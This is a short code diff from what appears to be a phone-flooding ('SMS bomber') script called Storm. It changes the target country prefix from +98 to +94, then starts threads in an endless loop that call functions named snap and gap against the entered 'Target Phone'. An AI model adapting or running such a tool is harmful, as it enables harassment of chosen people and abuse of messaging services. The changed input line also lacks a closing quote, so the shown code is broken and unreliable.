@@ -116,7 +116,7 @@ def main():
     time.sleep(1)
     print(f"{Fore.LIGHTBLUE_EX}Storm is online")
     time.sleep(1)
-    phone = '+98' + str(input(f"{Fore.GREEN }Target Phone : +98"))
+    phone = '+94' + str(input(f"{Fore.GREEN }Target Phone : +94))
     while True:
         Thread(target=snap, args=[phone]).start()
         Thread(target=gap, args=[phone]).start()
